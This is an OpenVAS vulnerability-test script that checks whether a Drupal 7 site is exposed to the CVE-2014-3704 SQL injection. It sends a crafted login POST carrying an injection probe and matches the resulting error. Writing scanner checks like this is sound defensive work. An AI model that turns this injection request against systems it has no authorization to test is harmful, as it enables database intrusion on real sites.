###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_drupal_70595.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Drupal Core SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:drupal:drupal";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105101");
  script_bugtraq_id(70595);
  script_cve_id("CVE-2014-3704");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 13659 $");

  script_name("Drupal Core SQL Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/70595");
  script_xref(name:"URL", value:"http://drupal.org/");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to execute arbitrary
code, to gain elevated privileges and to compromise the application, access or modify data, or exploit
latent vulnerabilities in the underlying database.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP POST request and check the response.");
  script_tag(name:"insight", value:"Drupal fails to sufficiently sanitize user-supplied data before using
it in an SQL query.");

  script_tag(name:"solution", value:"Updates are available");
  script_tag(name:"summary", value:"Drupal is prone to an SQL-injection vulnerability");
  script_tag(name:"affected", value:"Drupal 7.x versions prior to 7.32 are vulnerable.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2014-10-30 17:18:15 +0100 (Thu, 30 Oct 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("drupal_detect.nasl");
  script_mandatory_keys("drupal/installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

useragent = http_get_user_agent();
host = http_host_name(port:port);

data = 'name[0;%20SELECT+OpenVAS;#]=0&name[0]==OpenVAS&pass=OpenVAS&test2=test&form_build_id=&form_id=user_login_block&op=Log+in';
len = strlen( data );

if (dir == "/") dir = "";

req = 'POST ' + dir  + '/?q=node&destination=node HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Cookie: ZDEDebuggerPresent=php,phtml,php3\r\n' +
      'Connection: Close\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      'Content-Length: ' + len + '\r\n' +
      '\r\n' +
      data;
result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( tolower( result ) =~ "warning.*mb_strlen\(\) expects parameter 1" && "The website encountered an unexpected error" >!< result ) {
    security_message( port:port );
    exit( 0 );
}

exit(99);
